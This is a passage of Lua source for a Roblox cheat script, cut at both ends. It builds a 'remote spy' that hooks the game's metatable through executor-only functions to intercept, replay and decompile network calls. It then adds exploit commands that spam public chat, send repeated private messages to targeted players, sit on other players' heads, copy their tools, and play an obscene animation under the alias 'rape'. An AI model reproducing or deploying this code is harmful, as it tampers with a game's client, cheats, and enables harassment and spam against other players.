Globals.TextSize = 17
Globals.TextXAlignment = Enum.TextXAlignment.Left

Enabled.Name = "Enabled"
Enabled.Parent = SBTN
Enabled.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Enabled.BorderSizePixel = 1
Enabled.BorderColor3 = Color3.fromRGB(30, 100, 30)
Enabled.Position = UDim2.new(0, 210, 0, 0)
Enabled.Size = UDim2.new(0, 100, 1, 0)
Enabled.ZIndex = 4
Enabled.Font = Enum.Font.SourceSansBold
Enabled.FontSize = Enum.FontSize.Size14
Enabled.Text = "Enabled"
Enabled.TextColor3 = Color3.fromRGB(60, 200, 60)
Enabled.TextSize = 14

FullScreen.Name = "FullScreen"
FullScreen.Parent = Ribbon
FullScreen.BackgroundColor3 = Color3.new(1, 0, 0)
FullScreen.BorderSizePixel = 0
FullScreen.Position = UDim2.new(1, -90, 0, 0)
FullScreen.Size = UDim2.new(0, 40, 0, 20)
FullScreen.ZIndex = 3
FullScreen.Font = Enum.Font.SourceSansBold
FullScreen.FontSize = Enum.FontSize.Size14
FullScreen.Text = "[~]"
FullScreen.TextColor3 = Color3.new(1, 1, 1)
FullScreen.TextSize = 14

SetRemotesTab.Name = "SetRemotesTab"
SetRemotesTab.Parent = BG
SetRemotesTab.Visible = false
SetRemotesTab.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SetRemotesTab.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SetRemotesTab.ClipsDescendants = true
SetRemotesTab.Position = UDim2.new(0, 270, 1, -50)
SetRemotesTab.Size = UDim2.new(1, -280, 0, 40)
SetRemotesTab.ZIndex = 2

FilterF.Name = "FilterF"
FilterF.Parent = SetRemotesTab
FilterF.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
FilterF.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
FilterF.Position = UDim2.new(0, 120, 0.5, -10)
FilterF.Size = UDim2.new(0, 120, 0, 20)
FilterF.ZIndex = 3
FilterF.Font = Enum.Font.SourceSansBold
FilterF.FontSize = Enum.FontSize.Size14
FilterF.Text = "FILTER FUNCTIONS"
FilterF.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
FilterF.TextSize = 14

FilterE.Name = "FilterE"
FilterE.Parent = SetRemotesTab
FilterE.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
FilterE.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
FilterE.Position = UDim2.new(0, 10, 0.5, -10)
FilterE.Size = UDim2.new(0, 100, 0, 20)
FilterE.ZIndex = 3
FilterE.Font = Enum.Font.SourceSansBold
FilterE.FontSize = Enum.FontSize.Size14
FilterE.Text = "FILTER EVENTS"
FilterE.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
FilterE.TextSize = 14

Search.Name = "Search"
Search.Parent = SetRemotesTab
Search.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Search.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Search.Position = UDim2.new(0, 250, 0.5, -10)
Search.Selectable = true
Search.Size = UDim2.new(1, -260, 0, 20)
Search.ZIndex = 3
Search.Font = Enum.Font.SourceSansBold
Search.FontSize = Enum.FontSize.Size14
Search.Text = "[SEARCH]"
Search.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Search.TextSize = 14

-- FrontEnd-Backend // UI Functions

local HasSpecial = function(string)
   return (string:match("%c") or string:match("%s") or string:match("%p")) ~= nil
end

local GetPath = function(Instance)
local Obj = Instance
local string = {}
local temp = {}
local error = false

while Obj ~= game do
if Obj == nil then
error = true
break
end
table.insert(temp, Obj.Parent == game and Obj.ClassName or tostring(Obj))
Obj = Obj.Parent
end

table.insert(string, "game:GetService(\"" .. temp[#temp] .. "\")")

for i = #temp - 1, 1, -1 do
table.insert(string, HasSpecial(temp[i]) and "[\"" .. temp[i] .. "\"]" or "." .. temp[i])
end

return (error and "nil -- Path contained invalid instance" or table.concat(string, ""))
end

local GetType = function(Instance)
local Types = 
{
EnumItem = function()
return "Enum." .. tostring(Instance.EnumType) .. "." .. tostring(Instance.Name)
end,
Instance = function()
return GetPath(Instance)
end,
CFrame = function()
return "CFrame.new(" .. tostring(Instance) .. ")"
end,
Vector3 = function()
return "Vector3.new(" .. tostring(Instance) .. ")"
end,
BrickColor = function()
return "BrickColor.new(\"" .. tostring(Instance) .. "\")"
end,
Color3 = function()
return "Color3.new(" .. tostring(Instance) .. ")"
end,
string = function()
local S = tostring(Instance)
return "\"" .. (encrypt_string and S:gsub(".", function(c) return "\\" .. c:byte() end) or S) .. "\""
end,
Ray = function()
return "Ray.new(Vector3.new(" .. tostring(Instance.Origin) .. "), Vector3.new(" .. tostring(Instance.Direction) .. "))"
end
}

return Types[typeof(Instance)] ~= nil and Types[typeof(Instance)]() or tostring(Instance)
end

local size_frame = function(frame, UDim)
frame:TweenSize(UDim, "Out", "Quint", 0.3)
end

local pos_frame = function(frame, UDim)
frame:TweenPosition(UDim, "Out", "Quint", 0.3)
end

local size_pos_frame = function(frame, UDim, UDim2)
frame:TweenSizeAndPosition(UDim, UDim2, "Out", "Quint", 0.3)
end

local hide = function()
size_frame(BG, UDim2.new(0, 300, 0, 20))
pos_frame(Title, UDim2.new(0, 0, 0, 0))
pos_frame(Remotes, UDim2.new(0, 10, 0, 100))
pos_frame(Source, UDim2.new(0, 270, 0, 100))
BG.Draggable = true
SetRemotes.Visible = false
SetRemotesTab.Visible = false
Source.Visible = true

return "[]"
end

local show = function()
size_frame(BG, UDim2.new(1, -300, 1, -200))
pos_frame(BG, UDim2.new(0.1, 0, 0.1, 0))
pos_frame(Title, UDim2.new(0.5, -100, 0, 0))
pos_frame(Remotes, UDim2.new(0, 10, 0, 80))
pos_frame(Source, UDim2.new(0, 270, 0, 80))
BG.Draggable = false

return "_"
end

local onclick_hide = function()
Hide.Text = Hide.Text == "_" and hide() or show()
end

local onclick_settings = function()
Source.Visible = not Source.Visible
SetRemotes.Visible = not Source.Visible
SetRemotesTab.Visible = not Source.Visible
end

local onclick_remotespy = function()
spy_enabled = not spy_enabled
EnableSpy.TextColor3 = EnableSpy.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
EnableSpy.BorderColor3 = EnableSpy.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
end

local onclick_cryptstring = function()
encrypt_string = not encrypt_string
CryptStrings.TextColor3 = CryptStrings.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
CryptStrings.BorderColor3 = CryptStrings.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
end

local clear_logs = function()
Remotes:ClearAllChildren()
remotes_fired = 0
Total.Text = "0"
end

local filter_events = function()
local n = 0
for i, v in pairs(SetRemotes:GetChildren()) do
v.Visible = not (FilterE.TextColor3 == Color3.fromRGB(60, 200, 60) and v.Icon.Image == "rbxassetid://413369623")
if v.Visible == true then
n = n + 1
v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
else
v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
end
end
end

local filter_functions = function()
local n = 0
for i, v in pairs(SetRemotes:GetChildren()) do
v.Visible = not (FilterF.TextColor3 == Color3.fromRGB(60, 200, 60) and v.Icon.Image == "rbxassetid://413369506")
if v.Visible == true then
n = n + 1
v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
else
v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
end
end
end

local onclick_fevents = function()
FilterE.TextColor3 = FilterE.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
FilterE.BorderColor3 = FilterE.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
filter_events()
end

local onclick_ffunctions = function()
FilterF.TextColor3 = FilterF.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
FilterF.BorderColor3 = FilterF.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
filter_functions()
end

local Highlight = function(string, keywords)
   local K = {}
   local S = string
   local Token =
   {
       ["="] = true,
       ["."] = true,
       [","] = true,
       ["("] = true,
       [")"] = true,
       ["["] = true,
       ["]"] = true,
       ["{"] = true,
       ["}"] = true,
       [":"] = true,
       ["*"] = true,
       ["/"] = true,
       ["+"] = true,
       ["-"] = true,
       ["%"] = true,
[";"] = true,
["~"] = true
   }
   for i, v in pairs(keywords) do
       K[v] = true
   end
   S = S:gsub(".", function(c)
       if Token[c] ~= nil then
           return "\32"
       else
           return c
       end
   end)
   S = S:gsub("%S+", function(c)
       if K[c] ~= nil then
           return c
       else
           return (" "):rep(#c)
       end
   end)
 
   return S
end

local Tokens = function(string)
   local Token =
   {
       ["="] = true,
       ["."] = true,
       [","] = true,
       ["("] = true,
       [")"] = true,
       ["["] = true,
       ["]"] = true,
       ["{"] = true,
       ["}"] = true,
       [":"] = true,
       ["*"] = true,
       ["/"] = true,
       ["+"] = true,
       ["-"] = true,
       ["%"] = true,
[";"] = true,
["~"] = true
   }
   local A = ""
   string:gsub(".", function(c)
       if Token[c] ~= nil then
           A = A .. c
       elseif c == "\n" then
           A = A .. "\n"
elseif c == "\t" then
A = A .. "\t"
       else
           A = A .. "\32"
       end
   end)
 
   return A
end

local strings = function(string)
   local highlight = ""
   local quote = false
   string:gsub(".", function(c)
       if quote == false and c == "\"" then
           quote = true
       elseif quote == true and c == "\"" then
           quote = false
       end
       if quote == false and c == "\"" then
           highlight = highlight .. "\""
       elseif c == "\n" then
           highlight = highlight .. "\n"
elseif c == "\t" then
   highlight = highlight .. "\t"
       elseif quote == true then
           highlight = highlight .. c
       elseif quote == false then
           highlight = highlight .. "\32"
       end
   end)
 
   return highlight
end

local comments = function(string)
   local ret = ""
   string:gsub("[^\r\n]+", function(c)
       local comm = false
       local i = 0
       c:gsub(".", function(n)
           i = i + 1
           if c:sub(i, i + 1) == "--" then
               comm = true
           end
           if comm == true then
               ret = ret .. n
           else
               ret = ret .. "\32"
           end
       end)
       ret = ret
   end)
   
   return ret
end

local copy_source = function()
local script = ""
local copy
for i, v in pairs(Source:GetChildren()) do
script = script .. v.SourceText.Text .. "\n"
end
if Clipboard ~= nil then
copy = Clipboard.set
elseif Synapse ~= nil then
copy = function(str)
Synapse:Copy(str)
end
elseif setclipboard ~= nil then 
copy = setclipboard
end
copy(script)
end

local onclick_fullscreen = function()
size_pos_frame(BG, UDim2.new(1, 0, 1, 40), UDim2.new(0, 0, 0, -40))
BG.Draggable = false
end

local filter_remotes = function(type)
local n = 0
if type == "Text" then
for i, v in pairs(SetRemotes:GetChildren()) do
if v.Name:lower():match(Search.Text:lower()) and string ~= "" then
v.Visible = true
n = n + 1
else
v.Visible = false
end
if v.Visible == true then
v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
else
v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
end
end
end
end

local fix = function(string)
if string == "/e fix" then
show()
wait(0.3)
pos_frame(BG, UDim2.new(0.1, 0, 0.1, 0))
end
end

-- FrontEnd-Connections // UI Events

Hide.MouseButton1Down:Connect(onclick_hide)
Settings.MouseButton1Down:Connect(onclick_settings)
ClearList.MouseButton1Down:Connect(clear_logs)
EnableSpy.MouseButton1Down:Connect(onclick_remotespy)
ToClipboard.MouseButton1Down:Connect(copy_source)
CryptStrings.MouseButton1Down:Connect(onclick_cryptstring)
FullScreen.MouseButton1Down:Connect(onclick_fullscreen)
FilterE.MouseButton1Down:Connect(onclick_fevents)
FilterF.MouseButton1Down:Connect(onclick_ffunctions)
Search.Changed:Connect(filter_remotes)
game:GetService("Players").LocalPlayer.Chatted:Connect(fix)

-- Recursive Remotefill // UI-Backend

Table_TS = function(T)
   local M = {}
   for i, v in pairs(T) do
       local I = "\n\t" .. (type(i) == "number" and "[" .. i .. "] = " or "[\"" .. i .. "\"] = ")
       table.insert(M, I .. (type(v) == "table" and Table_TS(v) or GetType(v)))
   end
   
   return "\n{" .. table.concat(M, ", ") .. "\n}"
end

function fill(base)
for i, v in pairs(base:GetChildren()) do
if v.ClassName:match("Remote") and v.Name ~= "CharacterSoundEvent" then
local B = SBTN:Clone()

B.Parent = SetRemotes
B.Icon.Image = (v.ClassName == "RemoteEvent" and "rbxassetid://413369506" or "rbxassetid://413369623")
B.RemoteName.Text = v.Name
B.ID.Text = GetPath(v)
B.Name = v.Name
B.Position = UDim2.new(0, 10, 0, -20 + #SetRemotes:GetChildren() * 30)
B.MouseButton1Down:Connect(function()
B.Enabled.Text = B.Enabled.Text == "Enabled" and "Disabled" or "Enabled"
B.Enabled.TextColor3 = B.Enabled.Text == "Enabled" and Color3.fromRGB(60, 200, 60) or Color3.fromRGB(200, 60, 60)
B.Enabled.BorderColor3 = B.Enabled.Text == "Enabled" and Color3.fromRGB(30, 100, 30) or Color3.fromRGB(100, 30, 30)
end)
end
fill(v)
end
end

fill(game)

-- Backend // Remotespy Backend

local game_meta = getrawmetatable(game)
local game_namecall = game_meta.__namecall
local namecall_dump = {}
local current_rmt = nil
local g_caller = nil
local f_return = nil
local Step = game:GetService("RunService").Stepped

local mwr

if setreadonly ~= nil then
mwr = function()
setreadonly(game_meta, false)
end
elseif make_writeable ~= nil then 
mwr = function()
make_writeable(game_meta)
end
end

mwr()

local namecall_script = function(object, method, ...)
local script = "-- Script\n-- R2Sv2 developed by Luckyxero\n\32\n"
local args = {}
for i, v in pairs{...} do
script = script .. "local A_" .. i .. " = " .. (type(v) == "table" and Table_TS(v) or GetType(v)) .. "\n"
table.insert(args, "A_" .. i)
end
script = script .. "local Event = " .. GetPath(object) .. "\n\n"
script = script .. "Event:" .. method .. "(" .. table.concat(args, ", ") .. ")"

return script
end

local dump_script = function(script)
Source:ClearAllChildren()
local lines = 0
script:gsub("[^\r\n]+", function(c)
lines = lines + 1
local tabs = 0
c:gsub("%\t", function() tabs = tabs + 1 end)
local line = ScriptLine:Clone()
line.Parent = Source
line.SourceText.Text = c 
line.Line.Text = lines
line.RemoteHighlight.Text = Highlight(c, {"FireServer", "InvokeServer", "invokeServer", "fireServer"})
line.Position = UDim2.new(0, tabs * (17 * 2), 0, -17 + #Source:GetChildren() * 17)
line.Globals.Text = Highlight(c, global_env)
line.Line.Position = UDim2.new(0, 0 - tabs * (17 * 2), 0, 0)
line.Strings.Text = strings(c)
line.Keywords.Text = Highlight(c, lua_keywords)
line.Tokens.Text = Tokens(c)
line.Comments.Text = comments(c)
end)
end

local log_remote = function(table)
if SetRemotes[table.object.Name].Enabled.Text == "Disabled" then return end
local B = RBTN:Clone()
g_caller = table.caller
remotes_fired = remotes_fired + 1
Total.Text = remotes_fired

B.Parent = Remotes
B.Position = UDim2.new(0, 10, 0, -20 + #Remotes:GetChildren() * 30)
B.Icon.Image = table.method == "FireServer" and "rbxassetid://413369506" or "rbxassetid://413369623"
B.RemoteName.Text = table.object.Name
B.ID.Text = tostring(remotes_fired)
B.MouseButton1Down:Connect(function()
dump_script(table.script)
g_caller = table.caller
f_return = table.freturn == nil and table.object.Name .. " is not RemoteFunction" or table.freturn
end)
end


local get_namecall_dump = function(script, object, ...)
local Ret = nil
if object.ClassName == "RemoteFunction" then
local freturn = {pcall(object.InvokeServer, object, ...)}
freturn = {select(2, unpack(freturn))}

if #freturn == 0 then
Ret = object.Name .. " is a void type RemoteFunction."
else
Ret = Table_TS(freturn)
end
end
namecall_dump[#namecall_dump + 1] = 
{ 
script = namecall_script(object, object.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer", ...),
caller = script,
object = object,
method = object.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer",
freturn = Ret
}
end

GetReturn.MouseButton1Down:Connect(function()
dump_script(f_return)
end)

Decompile.MouseButton1Down:Connect(function()
local source = decompile(g_caller)

dump_script(type(source) == "boolean" and "Failed to decompile caller script!" or source)
end)

Step:Connect(function()
while #namecall_dump > 0 do
log_remote(table.remove(namecall_dump, 1))
end
end)

local on_namecall = function(object, ...)
local method = select(#{...}, ...)
local args = {...}
args[#args] = nil
if object.Name ~= "CharacterSoundEvent" and method:match("Server") and spy_enabled == true then get_namecall_dump(getfenv(2).script, object, unpack(args)) end

return game_namecall(object, ...)
end

game_meta.__namecall = on_namecall
end)
headsitting = false
addcmd('headsit',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		headsitting = true
		Players.LocalPlayer.Character.Humanoid.Sit = true
		repeat wait()
			if Players[v].Character and Players[v].Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
				if Players:FindFirstChild(Players[v].Name) and Players.LocalPlayer.Character.Humanoid.Sit == true then
					Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
				else
					headsitting = false
				end
			end
		until headsitting == false
	end
end)

spamming = false
addcmd('spam',{},
function(args, speaker)
	spamming = true
	local spamstring = getstring(1)
	repeat wait(1)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamstring, "All")
	until spamming == false
end)

addcmd('nospam',{'unspam'},
function(args, speaker)
	spamming = false
end)

pmspamming = {}
addcmd('pmspam',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			if FindInTable(pmspamming, Players[v].Name) then return end
			table.insert(pmspamming, Players[v].Name)
			local pmspamstring = getstring(2)
			repeat wait(1)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Players[v].Name.." "..pmspamstring, "All")
			until not FindInTable(pmspamming, Players[v].Name)
		end)
	end
end)

addcmd('nopmspam',{'unpmspam'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for a,b in pairs(pmspamming) do
				if b == Players[v].Name then
					table.remove(pmspamming, a)
				end
			end
		end)
	end
end)

addcmd('blockhead',{},
function(args, speaker)
	Players.LocalPlayer.Character.Head.Mesh:Destroy()
end)

addcmd('blockhats',{},
function(args, speaker)
	for _,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if (v:IsA("Accessory")) then
			v.Handle.Mesh:remove()
		end
	end
end)

addcmd('clone',{},
function(args, speaker)
	local AnimationId = "215384594"
	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://"..AnimationId
	local k = Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	k:Play()
	k:AdjustSpeed(100)
end)

addcmd('creeper',{},
function(args, speaker)
	if r15(Players.LocalPlayer) then
		local lol = Players.LocalPlayer
		lol.Character["Head"].Mesh:Destroy()
		lol.Character["LeftUpperArm"]:Destroy()
		lol.Character["RightUpperArm"]:Destroy()
		for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA'Hat' or v:IsA'Accessory' then
				v.Parent = workspace
			end
		end
	else
		local lol = Players.LocalPlayer
		lol.Character["Head"].Mesh:Destroy()
		lol.Character["Left Arm"]:Destroy()
		lol.Character["Right Arm"]:Destroy()
		for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA'Hat' or v:IsA'Accessory' then
				v.Parent = workspace
			end
		end
	end
end)

bangplr = nil

addcmd('bang',{'rape'},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = "rbxassetid://148840371"
			bang = Players.LocalPlayer.Character.Humanoid:LoadAnimation(bangAnim)
			bang:Play(.1, 1, 1)
			bangplr = Players[v].Name
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unbang',{'unrape'},
function(args, speaker)
	bangplr = nil
	bang:Stop()
	bangAnim:Destroy()
end)

addcmd('bringpart',{},
function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			v.CFrame = speaker.Character.HumanoidRootPart.CFrame
		end
	end
end)

addcmd('gotopart',{},
function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			speaker.Character.HumanoidRootPart.CFrame = v.CFrame
			wait(0.1)
		end
	end
end)

gtools = false
addcmd('grabtools',{},
function(args, speaker)
	workspace.ChildAdded:connect(function(part)
		if gtools then
			if part:IsA("Tool") then
				part.Handle.CFrame = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			end
		end
	end)
end)

addcmd('nograbtools',{'ungrabtools'},
function(args, speaker)
	gtools = false
end)

addcmd('light',{},
function(args, speaker)
	local light = Instance.new("PointLight", speaker.Character.HumanoidRootPart)
	light.Range = 30
	if args[1] then
		light.Brightness = args[1]
	else
		light.Brightness = 5
	end
end)

addcmd('unlight',{'nolight'},
function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v.ClassName == "PointLight" then
			v:Destroy()
		end
	end
end)

addcmd('givetools',{},
function(args, speaker)
	for i,t in pairs(Players.LocalPlayer.Backpack:GetDescendants()) do
		if t:IsA("Tool") then
			t.Parent = Players.LocalPlayer.Character
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				t.Parent = Players[v].Character
			end
		end
	end
end)

addcmd('copytools',{'clonetools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for i,v in pairs(Players[v].Backpack:GetChildren()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Clone().Parent = speaker.Backpack
				end
			end
		end)
	end
end)


addcmd('spawnpoint',{'spawn'},
function(args, speaker)
	spawnpos = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	spawnpoint = true
	notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
end)

addcmd('nospawnpoint',{'nospawn'},
function(args, speaker)
	spawnpoint = false
	notify('Spawn Point','Removed spawn point')
end)

addcmd('hatspin',{'spinhats'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
			local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
			if v.Handle.AccessoryWeld then
				v.Handle.AccessoryWeld:Destroy()
			end
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinning = keep
			spinenabled = true
		end
	end
end)

addcmd('unhatspin',{'unspinhats'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			pcall(function()
				if v:IsA("Accessory") or v:IsA("Hat") then
					v.Parent = workspace
				end
				wait(0.5)
				v.Handle.no:Destroy()
				v.Handle.ha:Destroy()
				if v:IsA("Accessory") or v:IsA("Hat") then
					v.Parent = Players.LocalPlayer.Character
				end
			end)
		end
	end
end)

addcmd('ambient',{},
function(args, speaker)
	game:GetService("Lighting").Ambient = Color3.new(args[1],args[2],args[3])
	game:GetService("Lighting").OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

addcmd('nofog',{},
function(args, speaker)
	game:GetService("Lighting").FogEnd = 100000
end)

addcmd('brightness',{},
function(args, speaker)
	game:GetService("Lighting").Brightness = args[1]
end)

origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").TimeOfDay, fclr = game:GetService("Lighting").FogColor, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart}

addcmd('restorelighting',{'rlighting'},
function(args,speaker)
	game:GetService("Lighting").Ambient = origsettings.abt
	game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
	game:GetService("Lighting").Brightness = origsettings.brt
	game:GetService("Lighting").TimeOfDay = origsettings.time
	game:GetService("Lighting").FogColor = origsettings.fclr
	game:GetService("Lighting").FogEnd = origsettings.fe
	game:GetService("Lighting").FogStart = origsettings.fs
end)


addcmd('blockspam',{},
function(args, speaker)

local GetBackpack = game.Players.LocalPlayer.Backpack:GetChildren() --this haks makes it so u can drop the gears so u can give it to ur friends or watever
for i=1, #GetBackpack do
   if GetBackpack[i].ClassName == "Tool" then
       GetBackpack[i].CanBeDropped = true
   end
end


local GetBackpack = game.Players.LocalPlayer.Backpack:GetChildren() --makes it better lel
for i=1, #GetBackpack do
   if GetBackpack[i].ClassName == "Tool" then
       GetBackpack[i].CanBeDropped = true
   end
end
LPC = game:GetService('Players').LocalPlayer.Character

function removemesh()
  for _,c in pairs(game:GetService('Players').LocalPlayer.Backpack:GetChildren()) do
    if c:IsA('Tool') then
      c.Parent = LPC
      for _,x in pairs(c:GetDescendants()) do
        if x:IsA('SpecialMesh') or x:IsA('BlockMesh') then
          x:Remove()
        end
      end
    end
  end
end
function drop()
  for _,zx in pairs(LPC:GetChildren()) do
    if zx:IsA('Tool') then
      x.Parent = workspace
    end
  end
end

pcall(removemesh)
wait(0.1)
pcall(drop)	
end)
addcmd('lmaosign',{'lmao'},
function(args, speaker)
local Handles = {
CFrame.new(-2.47932649, -2.48046541, 11.918704, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-2.49850631, -3.68023038, 11.9323082, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-2.51768637, -4.87999392, 11.9459133, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.194016188, 11.0659618, 1.88829291, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-0.206802621, 10.266118, 1.89736247, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-2.51768637, -4.87999392, 11.9459133, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-1.65753007, -4.9403553, 7.83539152, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-1.6191721, -2.54082656, 7.80818272, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-1.63835204, -3.74059153, 7.82178736, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.869929373, -7.97430229, 3.87805605, 0.185753763, -0.0885646343, 0.978592098, 0.487673551, 0.872918665, -0.0135682495, -0.8530339, 0.479755968, 0.205339029), 
CFrame.new(-1.60842264, -1.12407112, 7.84890318, 0.169824079, 0.116239108, 0.97859019, -0.512135923, 0.858801961, -0.0131341107, -0.841946244, -0.498942912, 0.20537591),
CFrame.new(-1.18779457, -3.77220869, 5.66865683, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-1.16861475, -2.57244396, 5.65505219, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-1.20697463, -4.97197199, 5.68226051, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-0.759018064, -2.60118723, 3.69766212, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.778196156, -3.80095196, 3.71126676, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(-0.980865538, -3.9171896, 4.67129469, 0.194125995, 0.068435885, 0.978581727, -0.272411495, 0.96208787, -0.0132425297, -0.942392647, -0.26400739, 0.205409512),
CFrame.new(0.302834183, -5.25893974, 0.119167097, -0.194091126, 0.0684530064, -0.978587449, 0.272901505, 0.961950064, 0.0131621696, 0.94225806, -0.264504552, -0.205387428), 
CFrame.new(0.560022771, -3.87598085, -1.01880693, -0.205219269, 0.0159943067, -0.978580475, 0.0146320192, 0.999802947, 0.0132725937, 0.978605092, -0.0115948766, -0.205413446),
CFrame.new(0.579201698, -2.67621565, -1.03241158, -0.205219269, 0.0159943067, -0.978580475, 0.0146320192, 0.999802947, 0.0132725937, 0.978605092, -0.0115948766, -0.205413446), 
